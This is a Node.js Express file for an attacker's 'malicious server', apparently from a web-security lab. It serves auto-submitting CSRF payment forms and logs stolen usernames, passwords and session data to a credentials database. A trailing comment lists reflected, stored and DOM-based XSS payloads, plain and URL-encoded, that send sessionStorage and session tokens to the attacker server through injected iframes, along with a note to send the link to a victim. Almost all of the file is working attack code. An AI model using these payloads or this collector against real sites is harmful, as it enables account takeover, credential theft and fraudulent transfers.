const db = require("./db");

function insertRow(username, password) {
  db.run(
    `INSERT INTO credentials (username, password) VALUES (?, ?)`,
    [username, password],
    function (error) {
      if (error) {
        console.error(error.message);
      }
      console.log(`Inserted a row with the ID: ${this.lastID}`);
    }
  );
}


const express = require('express');
const app = express();
const path = require('path');

app.set('views', path.join(__dirname, 'views'));
app.set('view engine', 'ejs');
app.use(express.static(path.join(__dirname, 'public')));
app.use(express.urlencoded({ extended: true }));

app.get('/fakePayment', function(req, res) {

  res.send(`

      <body onload="document.forms[0].submit()">


        <form action="http://localhost:3000/payment" method="post">
        <input name="bankNumber" placeholder="bank number" value="evil_bank_number">
        <input name="amount" placeholder="amount" value="999">
        <button>pay</button>
        </form>

      </body>

      `);
})

app.get('/fakePaymentCSRF', function(req, res) {

  res.send(`

      <body onload="document.forms[0].submit()">
        <form action="http://localhost:3000/paymentSecure" method="post">
        <input name="bankNumber" placeholder="bank number" value="evil_bank_number">
        <input name="amount" placeholder="amount" value="999">
        <button>pay</button>
        </form>

      </body>

      `);
})


app.get('/', function(req, res) {
  console.log("app.get('/user/:username/:password', function(req, res)")

  console.log(req.params)

  insertRow(req.params.username, req.params.password);

  res.send("malicious server is up and running");

});

app.get('/user/:username/:password', function(req, res) {
    console.log("app.get('/user/:username/:password', function(req, res)")

    console.log(req.params)

    insertRow(req.params.username, req.params.password);

    res.send("thanks");

});

app.post('/post/:username/:password', function(req, res) {
    console.log("app.get('/user/:username/:password', function(req, res)")

    console.log(req.params)

    insertRow(req.params.username, req.params.password);

    res.send("thanks");

});

app.post('/:payload', function(req, res) {
  console.log("post '/:payload'")

  console.log(req.params)

  insertRow(req.params.payload, "none");

  res.send("thanks");

});

app.get('/:payload', function(req, res) {
  console.log("get '/:payload'")

  console.log(req.params)

  insertRow(req.params.payload, "none");

  res.send("thanks");

});



app.listen(3001);

console.log("listening on http://localhost:3001")

/*


reflected - 
dom
stored - 

reflected xss

https://www.urlencoder.org/

document.write('<script>document.write("<iframe src=http://localhost:3001/trackOrder/"+sessionStorage.getItem("username")+"/"+sessionStorage.getItem("sessionToken")+"></iframe>");</script>')

document.write%28%27%3Cscript%3Edocument.write%28%22%3Ciframe%20src%3Dhttp%3A%2F%2Flocalhost%3A3001%2Fuser%2F%22%2BsessionStorage.getItem%28%22username%22%29%2B%22%2F%22%2BsessionStorage.getItem%28%22sessionToken%22%29%2B%22%3E%3C%2Fiframe%3E%22%29%3B%3C%2Fscript%3E%27%29%0D%0A%0D%0A

http://localhost:3000/trackOrder/document.write%28%27%3Cscript%3Edocument.write%28%22%3Ciframe%20src%3Dhttp%3A%2F%2Flocalhost%3A3001%2Fuser%2F%22%2BsessionStorage.getItem%28%22username%22%29%2B%22%2F%22%2BsessionStorage.getItem%28%22sessionToken%22%29%2B%22%3E%3C%2Fiframe%3E%22%29%3B%3C%2Fscript%3E%27%29%0D%0A%0D%0A

shorter version

document.write('<script>document.write("<iframe src=http://localhost:3001/"+JSON.stringify(sessionStorage)+"></iframe>");</script>')

http://localhost:3000/trackOrder/document.write%28%27%3Cscript%3Edocument.write%28%22%3Ciframe%20src%3Dhttp%3A%2F%2Flocalhost%3A3001%2F%22%2BJSON.stringify%28sessionStorage%29%2B%22%3E%3C%2Fiframe%3E%22%29%3B%3C%2Fscript%3E%27%29


http://localhost:3000/trackOrder/%3Cscript%3Edocument.write%28%22%3Ciframe%20src%3Dhttp%3A%2F%2Flocalhost%3A3001%2F%22%2BJSON.stringify%28sessionStorage%29%2B%22%3E%3C%2Fiframe%3E%22%29%3B%3C%2Fscript%3E

we send the previous link to victim

--------------------------------------------------------------------------
--------------------------------------------------------------------------
--------------------------------------------------------------------------
stored xss
create post

store on http://localhost:3000/createPost

<script>document.write("<iframe src=http://localhost:3001/user/"+sessionStorage.getItem("username")+"/"+sessionStorage.getItem("sessionToken")+"></iframe>");</script>

launch on http://localhost:3000/viewPosts


--------------------------------------------------------------------------
--------------------------------------------------------------------------
--------------------------------------------------------------------------
dom based xss

'; document.write("<iframe src=http://localhost:3001/"+JSON.stringify(sessionStorage)+"></iframe>"); a='

%27%3B%20document.write%28%22%3Ciframe%20src%3Dhttp%3A%2F%2Flocalhost%3A3001%2F%22%2BJSON.stringify%28sessionStorage%29%2B%22%3E%3C%2Fiframe%3E%22%29%3B%20a%3D%27%0D%0A%0D%0A%0D%0A

http://localhost:3000/trackOrder/%27%3B%20document.write%28%22%3Ciframe%20src%3Dhttp%3A%2F%2Flocalhost%3A3001%2F%22%2BJSON.stringify%28sessionStorage%29%2B%22%3E%3C%2Fiframe%3E%22%29%3B%20a%3D%27

--------------------------------------------------------------------------
--------------------------------------------------------------------------
--------------------------------------------------------------------------
csrf
payment



/fishing/index.html
/fishing/payment_csrf.html

*/